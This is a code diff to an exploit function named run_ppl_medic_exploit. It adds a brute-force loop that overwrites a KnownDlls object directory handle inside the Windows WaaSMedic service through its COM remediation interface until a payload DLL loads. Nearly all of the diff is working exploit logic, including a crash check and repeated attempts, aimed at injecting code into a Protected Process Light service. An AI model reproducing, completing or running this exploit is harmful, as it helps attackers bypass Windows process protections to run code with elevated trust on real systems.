@@ -111,7 +111,7 @@ BOOL run_ppl_medic_exploit(
     }
     DPRINT("Known DLL Directory handle @ 0x%p", KnownDllDirectoryHandleAddr);
 
-    success = calculate_write_addresses(KnownDllDirectoryHandleAddr, &WriteAtLaunchDetectionOnly, &WriteAtLaunchRemediationOnly);
+    success = calculate_write_addresses(KnownDllDirectoryHandleAddr, (ULONG32)(ULONG_PTR)hBaseNamedObjects, &WriteAtLaunchDetectionOnly, &WriteAtLaunchRemediationOnly);
     if (!success)
         goto cleanup;
 
@@ -204,6 +204,44 @@ BOOL run_ppl_medic_exploit(
     if (!success)
         goto cleanup;
 
+    DPRINT("Remote DLL search path flag overwritten.");
+
+    DPRINT("Trying to write a valid object directory handle...");
+
+    for (int i = 0; i < MAX_ATTEMPTS; i++)
+    {
+        if ((i + 1) % 100 == 0)
+        {
+            DPRINT("Attempt %3d/%d (%d%%)", i + 1, MAX_ATTEMPTS, ((i + 1) * 100) / MAX_ATTEMPTS);
+        }
+
+        success = write_remote_known_dll_handle(
+            IWaaSRemediationEx,
+            (ULONG32)(ULONG_PTR)hBaseNamedObjects,
+            DispIdLaunchDetectionOnly,
+            DispIdLaunchRemediationOnly,
+            WriteAtLaunchDetectionOnly,
+            WriteAtLaunchRemediationOnly);
+        if (!success)
+            goto cleanup;
+
+        if (!create_task_handler_instance())
+        {
+            if (!is_service_running(STR_WAASMEDIC_SVC))
+            {
+                PRINT_ERR("Service %ls is no longer running, it probably crashed because of an invalid handle value.", STR_WAASMEDIC_SVC);
+                goto cleanup;
+            }
+        }
+
+        if (is_proxy_stub_dll_loaded(ProxyStubDllLoadEventHandle))
+        {
+            DPRINT("Payload DLL successfully loaded after %d attempts!", i + 1);
+            ret_val = TRUE;
+            break;
+        }
+    }
+
 cleanup:
     if (hBaseNamedObjects)
         NtClose(hBaseNamedObjects);
@@ -243,6 +281,12 @@ cleanup:
     // TODO: CoUninitialize
 
     return ret_val;
+}
+
+BOOL is_proxy_stub_dll_loaded(
+    IN HANDLE ProxyStubDllLoadEventHandle)
+{
+    return WaitForSingleObject(ProxyStubDllLoadEventHandle, 0) == WAIT_OBJECT_0;
 }
 
 BOOL enumerate_temporary_directories(
